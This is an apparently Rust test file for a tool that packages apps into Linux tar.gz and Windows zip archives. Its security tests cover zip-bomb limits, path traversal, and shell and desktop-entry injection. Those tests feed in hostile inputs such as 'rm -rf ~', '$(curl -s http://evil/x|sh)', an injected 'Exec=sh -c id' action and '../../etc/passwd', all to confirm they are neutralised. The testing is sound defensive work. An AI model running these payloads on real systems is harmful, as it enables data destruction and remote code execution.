            if name.ends_with("install.sh") {
                e.read_to_string(&mut install).unwrap();
                assert_eq!(e.header().mode().unwrap() & 0o111, 0o111);
            }
            if name.ends_with("/app") {
                assert_eq!(e.header().mode().unwrap() & 0o111, 0o111);
            }
            names.push(name);
        }
        assert!(names.len() >= 3, "아카이브 항목이 부족합니다: {names:?}");
        for want in ["app/app", "app/install.sh", "app/app.desktop", "app/README.txt"] {
            assert!(names.iter().any(|n| n == want), "{want} 가 없습니다: {names:?}");
        }
        assert!(install.contains("내 앱"), "install.sh 에 앱 이름이 없습니다");
        assert!(
            !install.contains("{{APP_SLUG}}"),
            "치환되지 않은 자리표시자가 남았습니다"
        );
    }

    #[test]
    fn windows_archive_has_exe_and_readme() {
        let dir = tempfile::tempdir().unwrap();
        let exe = dir.path().join("built-app.exe");
        std::fs::write(&exe, b"MZ fake").unwrap();

        let art = archive(Target::WindowsX64, &exe, "Demo App", "0.9.0", dir.path()).unwrap();
        assert_eq!(art.path.file_name().unwrap(), "demo-app-0.9.0-windows-x86_64.zip");

        let mut zip = zip::ZipArchive::new(File::open(&art.path).unwrap()).unwrap();
        let names: Vec<String> = zip.file_names().map(str::to_string).collect();
        assert!(names.contains(&"demo-app.exe".to_string()), "{names:?}");
        assert!(names.contains(&"README.txt".to_string()), "{names:?}");
        let mut readme = String::new();
        zip.by_name("README.txt").unwrap().read_to_string(&mut readme).unwrap();
        assert!(readme.contains("Demo App 0.9.0"));
    }

    #[test]
    fn linux_archive_with_icon_adds_png_and_installs_it() {
        let dir = tempfile::tempdir().unwrap();
        let exe = dir.path().join("built-app");
        std::fs::write(&exe, b"fake app binary").unwrap();
        let icon = dir.path().join("icon.png");
        std::fs::write(&icon, icon::sample_png(300, 300)).unwrap();

        let art =
            archive_with(ArchiveOptions::new(Target::LinuxX64, &exe, "내 앱", "1.2.3", dir.path()).icon(Some(&icon)))
                .unwrap();

        let gz = flate2::read::GzDecoder::new(File::open(&art.path).unwrap());
        let mut tar = tar::Archive::new(gz);
        let mut names = Vec::new();
        let mut png = Vec::new();
        let mut install = String::new();
        for e in tar.entries().unwrap() {
            let mut e = e.unwrap();
            let name = e.path().unwrap().to_string_lossy().to_string();
            if name.ends_with(".png") {
                e.read_to_end(&mut png).unwrap();
            }
            if name.ends_with("install.sh") {
                e.read_to_string(&mut install).unwrap();
            }
            names.push(name);
        }
        assert!(names.iter().any(|n| n == "app/app.png"), "{names:?}");
        // 아이콘 테마가 요구하는 256×256 정사각으로 맞춰 들어간다.
        let img = image::load_from_memory_with_format(&png, image::ImageFormat::Png).unwrap();
        assert_eq!(
            (img.width(), img.height()),
            (icon::LINUX_ICON_SIZE, icon::LINUX_ICON_SIZE)
        );
        assert!(
            install.contains("hicolor/256x256/apps"),
            "install.sh 가 아이콘을 설치하지 않습니다"
        );
        assert!(install.contains("app.png"));
    }

    #[test]
    fn linux_archive_without_icon_has_no_png() {
        let dir = tempfile::tempdir().unwrap();
        let exe = dir.path().join("built-app");
        std::fs::write(&exe, b"x").unwrap();
        let art = archive(Target::LinuxX64, &exe, "내 앱", "1.0.0", dir.path()).unwrap();

        let gz = flate2::read::GzDecoder::new(File::open(&art.path).unwrap());
        let mut tar = tar::Archive::new(gz);
        let names: Vec<String> = tar
            .entries()
            .unwrap()
            .map(|e| e.unwrap().path().unwrap().to_string_lossy().to_string())
            .collect();
        assert!(!names.iter().any(|n| n.ends_with(".png")), "{names:?}");
        assert_eq!(names.len(), 4);
    }

    #[test]
    fn fill_does_not_substitute_inside_substituted_values() {
        // 앱 이름이 다른 자리표시자처럼 생겨도 한 번만 치환된다.
        let out = fill(
            "이름={{APP_NAME}} 버전={{APP_VERSION}}",
            "slug",
            "{{APP_VERSION}}",
            "9.9",
            Syntax::Text,
        );
        assert_eq!(out, "이름={{APP_VERSION}} 버전=9.9");
    }

    // ── H7: zip bomb ──

    #[test]
    fn an_entry_that_claims_a_huge_size_is_refused_before_reading() {
        let mut budget = MAX_BUNDLE_BYTES;
        let err = read_capped(&mut "짧다".as_bytes(), MAX_ENTRY_BYTES + 1, "w", &mut budget)
            .unwrap_err()
            .to_string();
        assert!(err.contains("너무 큽니다"), "{err}");
        assert_eq!(budget, MAX_BUNDLE_BYTES, "읽지 않았으므로 예산도 그대로");
    }

    #[test]
    fn the_total_budget_runs_out_across_entries() {
        let data = vec![0u8; 1000];
        let mut budget = 2500;
        read_capped(&mut &data[..], 1000, "a", &mut budget).unwrap();
        assert_eq!(budget, 1500);
        read_capped(&mut &data[..], 1000, "b", &mut budget).unwrap();
        assert_eq!(budget, 500);
        let err = read_capped(&mut &data[..], 1000, "c", &mut budget)
            .unwrap_err()
            .to_string();
        assert!(err.contains("전체 해제 크기"), "{err}");
    }

    /// 중앙 디렉터리의 숫자가 실제와 다르면 거절한다 — 위조한 `uncompressed_size` 를 잡는 자리다.
    #[test]
    fn a_declared_size_that_does_not_match_the_content_is_refused() {
        let mut budget = MAX_BUNDLE_BYTES;
        // 주장보다 적게 들어 있다.
        let err = read_capped(&mut &b"abc"[..], 100, "a", &mut budget)
            .unwrap_err()
            .to_string();
        assert!(err.contains("크기가 목록과 다릅니다"), "{err}");
        // 주장보다 많이 들어 있다.
        let err = read_capped(&mut &b"abcdef"[..], 3, "a", &mut budget)
            .unwrap_err()
            .to_string();
        assert!(err.contains("크기가 목록과 다릅니다"), "{err}");
        // 맞으면 통과.
        assert_eq!(read_capped(&mut &b"abc"[..], 3, "a", &mut budget).unwrap(), b"abc");
    }

    #[test]
    fn too_many_entries_are_refused() {
        let mut zip = zip::ZipWriter::new(Cursor::new(Vec::<u8>::new()));
        let opts = file_options().compression_method(zip::CompressionMethod::Stored);
        for i in 0..=MAX_ZIP_ENTRIES {
            zip.start_file(format!("assets/{i}"), opts).unwrap();
            zip.write_all(b"x").unwrap();
        }
        let bytes = zip.finish().unwrap().into_inner();

        let err = Bundle::from_zip(&bytes).unwrap_err().to_string();
        assert!(err.contains("항목이 너무 많습니다"), "{err}");
    }

    /// L19: 정규화하면 같은 파일이 되는 두 항목이 조용히 덮어쓰지 못한다.
    #[test]
    fn duplicate_entry_names_are_refused() {
        let bundle = sample();
        let mut zip = zip::ZipWriter::new(Cursor::new(Vec::<u8>::new()));
        let opts = file_options();
        zip.start_file(MANIFEST_NAME, opts).unwrap();
        zip.write_all(serde_json::to_string(&bundle.manifest).unwrap().as_bytes())
            .unwrap();
        zip.start_file(PROJECT_NAME, opts).unwrap();
        zip.write_all(ProjectFile::new(bundle.project.clone()).to_json().as_bytes())
            .unwrap();
        zip.start_file("weights/a.bin", opts).unwrap();
        zip.write_all(b"first").unwrap();
        zip.start_file("weights/./a.bin", opts).unwrap();
        zip.write_all(b"second").unwrap();
        let bytes = zip.finish().unwrap().into_inner();

        let err = Bundle::from_zip(&bytes).unwrap_err().to_string();
        assert!(err.contains("두 번 있습니다"), "{err}");
    }

    /// L20: 중간에 실패하면 그때까지 쓴 파일이 남지 않는다.
    #[test]
    fn a_failed_materialize_leaves_nothing_behind() {
        let dir = tempfile::tempdir().unwrap();
        let mut weights = BTreeMap::new();
        weights.insert("ok.bin".to_string(), b"a".to_vec());
        // BTreeMap 이라 "ok.bin" 다음에 온다 — 앞의 파일이 이미 쓰인 뒤 실패한다.
        weights.insert("zz/../../탈출.bin".to_string(), b"b".to_vec());

        let err = materialize(&weights, dir.path(), "가중치").unwrap_err().to_string();
        assert!(err.contains("폴더 밖"), "{err}");
        let left: Vec<String> = std::fs::read_dir(dir.path())
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into())
            .collect();
        assert!(left.is_empty(), "반쯤 풀린 파일이 남았습니다: {left:?}");
    }

    /// H8: 악의적인 앱 이름이 셸·Desktop·텍스트 어디서도 문법을 깨지 못한다.
    const EVIL_NAME: &str = r#"a"; rm -rf ~; echo ""#;

    #[test]
    fn a_malicious_name_cannot_break_out_of_the_install_script() {
        let out = fill(INSTALL_SH, "app", EVIL_NAME, "0.1.0", Syntax::Shell);
        // 이름은 단일 인용 문자열 하나로만 들어간다.
        assert!(out.contains(r#"APP_NAME='a"; rm -rf ~; echo "'"#), "{out}");

        // 명령 치환·백틱이 인용 밖으로 새지 않는다.
        for evil in ["$(id)", "`id`", "$(curl -s http://evil/x|sh)"] {
            let out = fill(INSTALL_SH, "app", evil, "0.1.0", Syntax::Shell);
            assert!(out.contains(&format!("APP_NAME='{evil}'")), "{out}");
        }

        // 단일 인용부호가 든 이름도 인용을 깨지 못한다.
        let out = fill(INSTALL_SH, "app", "a'; id; echo '", "0.1.0", Syntax::Shell);
        assert!(out.contains(r"APP_NAME='a'\''; id; echo '\'''"), "{out}");

        // 개행으로 주석이나 대입을 탈출하지 못한다.
        let out = fill(INSTALL_SH, "app", "앱\nrm -rf ~", "0.1.0", Syntax::Shell);
        assert_eq!(out.lines().filter(|l| l.starts_with("APP_NAME=")).count(), 1, "{out}");
        assert!(!out.lines().any(|l| l.trim() == "rm -rf ~"), "{out}");
    }

    #[test]
    fn the_generated_install_script_is_valid_bash() {
        let dir = tempfile::tempdir().unwrap();
        for evil in [EVIL_NAME, "a'; id; echo '", "$(id)", "앱\n[Desktop Entry]", "\\", "'''"] {
            let out = fill(INSTALL_SH, "app", evil, "0.1.0", Syntax::Shell);
            let path = dir.path().join("install.sh");
            std::fs::write(&path, &out).unwrap();
            // 문법 검사만 한다 (-n). 인용이 깨졌으면 여기서 잡힌다.
            match std::process::Command::new("bash").arg("-n").arg(&path).output() {
                Ok(o) => assert!(o.status.success(), "{evil:?}: {}", String::from_utf8_lossy(&o.stderr)),
                Err(e) => {
                    eprintln!("bash 가 없어 문법 검사를 건너뜁니다: {e}");
                    return;
                }
            }
        }
    }

    /// 모르는 플래그를 주면 **설치하지 않고** 종료 코드 2 로 끝난다.
    ///
    /// 예전에는 `--uninstall` 만 보고 나머지는 무시해서, `./install.sh --headless` 처럼 앱에 줄
    /// 법한 플래그를 붙이면 조용히 설치가 됐다. 실제로 그렇게 잘못 설치한 적이 있어 시험으로 못 박는다.
    #[test]
    fn unknown_flags_are_refused_without_installing() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("install.sh");
        std::fs::write(&path, fill(INSTALL_SH, "app", "시험앱", "1.0.0", Syntax::Shell)).unwrap();

        let run = |args: &[&str]| -> Option<(i32, String)> {
            match std::process::Command::new("bash").arg(&path).args(args).output() {
                Ok(o) => Some((
                    o.status.code().unwrap_or(-1),
                    String::from_utf8_lossy(&o.stderr).into_owned(),
                )),
                Err(e) => {
                    eprintln!("bash 가 없어 실행 시험을 건너뜁니다: {e}");
                    None
                }
            }
        };

        for bad in ["--headless", "--run-for", "-x", "--uninstall-all"] {
            let Some((code, err)) = run(&[bad]) else { return };
            assert_eq!(code, 2, "{bad}: 종료 코드가 2 가 아니다 — {err}");
            assert!(err.contains("모르는 인자"), "{bad}: 이유를 안 알려 준다 — {err}");
            assert!(err.contains("사용법"), "{bad}: 사용법을 안 보여 준다 — {err}");
        }

        // `--help` 는 0 이고 사용법을 표준 출력으로 낸다.
        let out = std::process::Command::new("bash")
            .arg(&path)
            .arg("--help")
            .output()
            .expect("bash");
        assert_eq!(out.status.code(), Some(0));
        assert!(
            String::from_utf8_lossy(&out.stdout).contains("사용법"),
            "--help 가 사용법을 안 냈다"
        );

        // 아무 인자도 없으면 설치를 시도한다. 실행 파일이 없으니 1 로 끝나야 한다 —
        // **2 가 아니어야** 인자 거부와 구분된다.
        let Some((code, _)) = run(&[]) else { return };
        assert_eq!(code, 1, "인자 없는 호출이 설치를 시도하지 않았다");
    }

    #[test]
    fn a_malicious_name_cannot_add_desktop_keys_or_groups() {
        let evil = "앱\nActions=pwn\n\n[Desktop Action pwn]\nExec=sh -c id";
        let out = fill(DESKTOP, "app", evil, "0.1.0", Syntax::Desktop);

        // 값은 한 줄로 접힌다 — 주입한 글자는 Name 값 안에 남지만 새 키도 새 그룹도 되지 못한다.
        assert!(!out.lines().any(|l| l.starts_with("Actions=")), "{out}");
        assert!(!out.lines().any(|l| l.starts_with("[Desktop Action")), "{out}");
        assert!(!out.lines().any(|l| l.starts_with("Exec=sh")), "{out}");
        assert_eq!(out.lines().filter(|l| l.starts_with('[')).count(), 1, "{out}");
        let name_lines: Vec<&str> = out.lines().filter(|l| l.starts_with("Name=")).collect();
        assert_eq!(name_lines.len(), 1, "{out}");
        assert!(name_lines[0].contains(r"\nActions=pwn"), "{name_lines:?}");
    }

    #[test]
    fn control_characters_never_reach_the_output() {
        let evil = "앱\u{0}\u{1}\r\n\t끝";
        for out in [
            fill(INSTALL_SH, "app", evil, "0.1.0", Syntax::Shell),
            fill(README_LINUX, "app", evil, "0.1.0", Syntax::Text),
            fill(README_WINDOWS, "app", evil, "0.1.0", Syntax::Text),
        ] {
            assert!(!out.contains('\u{0}'), "{out}");
            assert!(!out.contains('\u{1}'), "{out}");
        }
        // Desktop 은 명세대로 두 글자 표기로 바꾼다 — 실제 제어문자는 남지 않는다.
        let escaped = desktop_escape(evil);
        assert!(!escaped.chars().any(|c| c.is_control()), "{escaped}");
        assert!(escaped.contains(r"\r\n\t"), "{escaped}");
        assert_eq!(desktop_escape(r"a\b"), r"a\\b");
    }

    #[test]
    fn slug_stays_safe_for_file_names() {
        for evil in [EVIL_NAME, "../../etc/passwd", "a/b", "앱\n이름", "..", r"C:\x", "."] {
            let slug = slugify(evil);
            assert!(
                slug.chars()
                    .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-'),
                "{evil} → {slug}"
            );
            assert!(!slug.is_empty() && slug != "." && slug != "..", "{evil} → {slug}");
        }
    }

    #[test]
    fn a_version_with_path_separators_is_refused() {
        for evil in [
            "../../../etc/cron.d/x",
            "0.1.0/../..",
            "1.0",
            "",
            "0.1.0\nx",
            r"0.1.0\..\..",
        ] {
            assert!(check_version(evil).is_err(), "{evil:?} 는 거부해야 합니다");
        }
        assert_eq!(check_version(" 0.1.0 ").unwrap(), "0.1.0");
        assert_eq!(check_version("1.2.3-beta.1+build").unwrap(), "1.2.3-beta.1+build");
    }

    #[test]
    fn artifacts_must_land_inside_the_output_folder() {
        let dir = tempfile::tempdir().unwrap();
        ensure_inside(dir.path(), &dir.path().join("app.tar.gz")).unwrap();
        let sub = dir.path().join("nested");
        std::fs::create_dir(&sub).unwrap();
        ensure_inside(dir.path(), &sub.join("app.tar.gz")).unwrap();
        // 부모 폴더로 나가면 거부.
        assert!(ensure_inside(&sub, &dir.path().join("app.tar.gz")).is_err());
    }

    #[test]
    fn fill_tokens_leaves_unknown_markers_alone() {
        assert_eq!(fill_tokens("a@B@c", "@", &[("@X@", "1")]), "a@B@c");
        assert_eq!(fill_tokens("a@X@c", "@", &[("@X@", "1")]), "a1c");
        assert_eq!(fill_tokens("{{A}}{{B}}", "{{", &[("{{A}}", "1")]), "1{{B}}");
    }

    #[test]
    fn slugify_folds_non_ascii() {
        assert_eq!(slugify("내 앱"), "app");
        assert_eq!(slugify("Demo App"), "demo-app");
        assert_eq!(slugify("Foo__Bar 2"), "foo-bar-2");
        assert_eq!(slugify(""), "app");
        assert_eq!(slugify("---"), "app");
    }

    #[test]
    fn entry_paths_do_not_double_prefix() {
        assert_eq!(entry_path("weights", "a.bin"), "weights/a.bin");
        assert_eq!(entry_path("weights", "weights/a.bin"), "weights/a.bin");
        assert_eq!(strip_dir("weights/a.bin", "weights"), Some("a.bin"));
        assert_eq!(strip_dir("assets/a.bin", "weights"), None);
        assert!(safe_relative("../escape").is_none());
        assert!(safe_relative("/etc/passwd").is_none());
    }

    /// `NL_RUNTIMES_DIR` 은 프로세스 전역이라 이 시험 하나로 두 대상을 함께 본다 —
    /// 나눠 두면 병렬 실행 때 서로의 환경 변수를 지워 경쟁한다.
    #[test]
    fn find_runtime_reads_env_dir() {
        let dir = tempfile::tempdir().unwrap();
        for target in [Target::LinuxX64, Target::WindowsX64] {
            let triple_dir = dir.path().join(target.triple());
            std::fs::create_dir_all(&triple_dir).unwrap();
            std::fs::write(triple_dir.join(target.runtime_file_name()), b"MZ").unwrap();
        }

        unsafe { std::env::set_var("NL_RUNTIMES_DIR", dir.path()) };
        let linux = find_runtime(Target::LinuxX64);
        let windows = find_runtime(Target::WindowsX64);
        unsafe { std::env::remove_var("NL_RUNTIMES_DIR") };

        // 현재 실행 파일 옆에 nl-runtime 이 있으면 그쪽이 먼저다 — 이름만 확인한다.
        let linux = linux.expect("Linux 런타임을 찾지 못했습니다");
        assert_eq!(linux.file_name().unwrap(), "nl-runtime");

        // Windows 용은 테스트 바이너리 옆에 있을 리 없으니 triple 폴더에서 찾아야 한다.
        let windows = windows.expect("Windows 런타임을 찾지 못했습니다");
        assert_eq!(windows.file_name().unwrap(), "nl-runtime.exe");
        assert!(windows.starts_with(dir.path()), "{}", windows.display());
        assert!(
            windows.parent().unwrap().ends_with("x86_64-pc-windows-msvc"),
            "크로스 빌드 산출물을 두는 triple 폴더에서 찾아야 합니다: {}",
            windows.display()
        );
    }
}
